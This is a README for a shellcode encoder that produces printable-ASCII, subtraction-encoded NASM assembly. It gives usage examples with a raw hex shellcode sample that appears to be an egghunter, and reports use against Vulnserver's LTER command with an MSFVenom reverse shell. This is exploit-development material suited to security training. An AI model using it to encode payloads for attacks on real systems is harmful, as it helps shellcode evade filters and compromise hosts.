# Automatic ASCII Shellcode Subtraction Encoder
Generates printable ASCII subtraction encoded shellcode in assembly format for NASM.

# Installation
```
$ git clone https://github.com/EAugustoAnalysis/Automatic-ASCII-Shellcode-Subtraction-Encoder.git
$ cd Automatic-ASCII-Shellcode-Subtraction-Encoder
# pip3 install z3-solver
$ python3 encoder.py
```
Based on Marcos Valle's z3ncoder, which can ASCII encode a 32 bit address:
https://github.com/marcosValle/z3ncoder

# Usage
```
$ python3 encoder.py -s [shellcode] -b [badchars] -n [custom eax normalizer] -f [output file] -p
```

# Example
```
$ python3 encoder.py -s 6681caff0f42526a0258cd2e3c055a74efb8543030578bfaaf75eaaf75e7ffe7
$ python3 encoder.py -s 6681caff0f42526a0258cd2e3c055a74efb8543030578bfaaf75eaaf75e7ffe7 -f egghunter.asm
$ python3 encoder.py -s 6681caff0f42526a0258cd2e3c055a74efb8543030578bfaaf75eaaf75e7ffe7 -b "0x2e,0x40" -n "and eax,0x23232323\nand eax,0x42324543\nand eax, 0x44444444"
$ python3 encoder.py -s 6681caff0f42526a0258cd2e3c055a74efb8543030578bfaaf75eaaf75e7ff -p #Automatic nop padding enabled
```

# Notes

Shellcode length must be a multiple of 4, nop padding can accomplish this. Shellcode must be in hex format.

This script will not generate the instructions required to reserve stack space for the decoded shellcode.

- Used to exploit LTER in Vulnserver with shellcode containing null bytes (unencoded MSFVenom Reverse Shell).
- Confirmed working with most MSFVenom x86 encoders.

Known Compatibility Issues
- When used with MSFVenom Shikata_ga_nai encoder, has an unexplained tendency to generate odd instructions and overwrite the EIP.


# Coming Soon
- Verbosity settings
- ~~Automatic nop padding~~
implemented as an optional flag
- Return byte length of generated shellcode
- ~~Proper processing of "0x00000000" lines~~
implemented
- ~~Custom badchars, (currently badchars are 00, 20, 0a, 0d, 3a, 3f, and any character that's not printable, valid ASCII)~~
implemented
- ~~Custom output files for assembly code~~
implemented
- ~~Custom normalizer~~
implemented

# Coming Eventually
- Automatic badchar-based normalizer adjustment
